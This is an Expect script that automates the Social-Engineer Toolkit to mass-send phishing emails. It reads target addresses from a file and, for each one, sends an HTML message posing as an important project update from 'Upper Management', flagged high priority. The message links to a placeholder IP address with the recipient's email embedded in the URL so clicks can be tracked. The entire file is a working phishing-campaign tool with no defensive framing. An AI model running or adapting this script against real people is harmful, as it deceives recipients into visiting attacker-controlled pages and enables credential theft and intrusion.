#!/usr/bin/expect

# Set timeout for commands to 2 seconds
set timeout 2

# Open the file containing user email addresses
set file [open "path" r]

# Loop through each line in the file
while {[gets $file line] != -1} {
    # Trim leading and trailing spaces from the email address
    set email [string trim $line]

    # Start the Social-Engineer Toolkit
    spawn sudo setoolkit

    # Handle the password prompt if needed
    expect "password:"
    send "userpassword\r"

    # Expect the menu
    expect "Select from the menu:"
    send "1\r"
    expect "Select from the menu:"
    send "5\r"
    expect "set:mailer>"
    send "1\r"
    expect {
        "Do you want to use a predefined template or craft" {
            send "2\r"
        }
        timeout {
            # Handle timeout if needed
        }
    }

    # Wait for the prompt for template selection to appear again
    expect {
        "Subject of the email" {
            send "Subject_text\r"
        }
        timeout {
            # Handle timeout if needed
        }
    }
    expect "Send the message as html or plain? 'h' or 'p':"
    send "h\r"
    expect "Enter the body of the message"
    send "Hi, <br>\r"
    expect "Next line of the body:"
    send "<br>\r"
    expect "Next line of the body:"
    send "I am writing to inform you of some important updates regarding our ongoing <a href=\"http://ip-address/$email/\">project.</a>\r"
    expect "Next line of the body:"
    send "<br>\r"
    expect "Next line of the body:"
    send "<br>\r"
    expect "Next line of the body:"
    send "Thanks,<br>\r"
    expect "Next line of the body:"
    send "<br>\r"
    expect "Next line of the body:"
    send "Name for email<br>\r"
    expect "Next line of the body:"
    send "END\r"
    expect "Send email to:"
    send "$email\r"
    expect "set:phishing>"
    send "1\r"
    expect "set:phishing>"
    send "smtp username\r"
    expect "set:phishing>"
    send "Upper Management\r"
    expect "set:phishing>"
    expect "Email password:"
    send "smtp server password\r"
    expect "set:phishing>"
    expect "Flag this message/s as high priority?:"
    send "Yes\r"
    expect "set:phishing>"
    expect "Do you want to attach a file:"
    send "n\r"
    expect "set:phishing>"
    expect "Do you want to attach an inline file:"
    send "n\r"

    # Wait for the emails to be sent and the process to complete
    expect "Press <return> to continue"
    send "\r"

    # Close the Social-Engineer Toolkit
    expect eof
}

# Close the file
close $file
